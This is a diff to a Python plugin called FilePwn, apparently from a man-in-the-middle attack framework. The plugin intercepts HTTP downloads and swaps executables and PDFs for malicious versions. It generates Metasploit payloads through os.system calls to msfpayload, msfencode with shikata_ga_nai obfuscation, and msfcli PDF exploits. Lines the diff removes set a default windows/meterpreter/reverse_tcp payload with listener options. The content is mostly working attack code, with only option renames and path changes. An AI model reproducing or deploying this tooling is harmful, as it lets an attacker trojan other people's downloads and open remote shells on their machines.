@@ -4,12 +4,12 @@ from plugins.plugin import Plugin
 exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe', 'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']
 
 class FilePwn(Plugin):
-    name = "File Pwn"
+    name = "FilePwn"
     optname = "filepwn"
     implements = ["handleResponse"]
     has_opts = True
     log_level = logging.DEBUG
-    desc = "Replace files being downloaded via HTTP with malicious versions."
+    desc = "Replace files being downloaded via HTTP with malicious versions. Currently only supports Windows MSF options."
     def initialize(self,options):
         '''Called if plugin is enabled, passed the options namespace'''
         self.options = options
@@ -28,7 +28,7 @@ class FilePwn(Plugin):
             logging.info("Generating our executable...")
             msfp = os.path.join(self.options.msf_path,"msfpayload") + " %s %s"
             msfe = os.path.join(self.options.msf_path,"msfencode") + " %s"
-            payload = msfp%(self.options.msf_payload,self.options.msf_payload_opts)
+            payload = msfp%(self.options.msf_win_payload,self.options.msf_win_payload_opts)
             encode = msfe % "-t exe -o /tmp/tmp.exe -e x86/shikata_ga_nai -c 8"
             print payload+" R |"+encode
             os.system(payload+" R |"+encode)
@@ -46,13 +46,14 @@ class FilePwn(Plugin):
         if self.options.pdf_exploit.find("embedded_exe") != -1:
             if not self.exe_made:
                 self._make_exe()
-            if self.options.msf_payload_opts.find("EXEFILE") == -1:
-                self.options.msf_payload_opts += " EXEFILE=" + self.exe
-        if self.options.msf_payload_opts.find("INFILENAME") == -1:
-            self.options.msf_payload_opts += " INFILENAME=" + "data/blank.pdf"
-        self.options.msf_payload_opts += " FILENAME=/tmp/tmp.pdf"
+            if self.options.msf_win_payload_opts.find("EXEFILE") == -1:
+                self.options.msf_win_payload_opts += " EXEFILE=" + self.exe
+        if self.options.msf_win_payload_opts.find("INFILENAME") == -1:
+            self.options.msf_win_payload_opts += " INFILENAME=" + \
+                                                  os.path.join(options.full_path,"data/blank.pdf")
+        self.options.msf_win_payload_opts += " FILENAME=/tmp/tmp.pdf"
         msfc = os.path.join(self.options.msf_path,"msfcli") + " %s %s E"
-        os.system(msfc % (self.options.pdf_exploit,self.options.msf_payload_opts))
+        os.system(msfc % (self.options.pdf_exploit,self.options.msf_win_payload_opts))
         self.payloads['application/pdf'] = open("/tmp/tmp.pdf","rb").read()
     
     def handleResponse(self,request,data):
@@ -66,12 +67,6 @@ class FilePwn(Plugin):
             return
 
     def add_options(self,options):
-        options.add_argument("--msf-path",type=str,default="/pentest/exploits/framework3/",
-                help="Path to msf (default: /pentest/exploits/framework3)")
-        options.add_argument("--msf-payload",type=str,default="windows/meterpreter/reverse_tcp",
-                help="Payload you want to use (default: windows/meterpreter/reverse_tcp)")
-        options.add_argument("--msf-payload-opts",type=str,default="LHOST=127.0.0.1 LPORT=4444",
-                help="Options for payload (default: \"LHOST=127.0.0.1 LPORT=4444\")")
         options.add_argument("--pdf",action="store_true",
                 help="Intercept PDFs and replace with malicious.")
         options.add_argument("--exe",action="store_true",
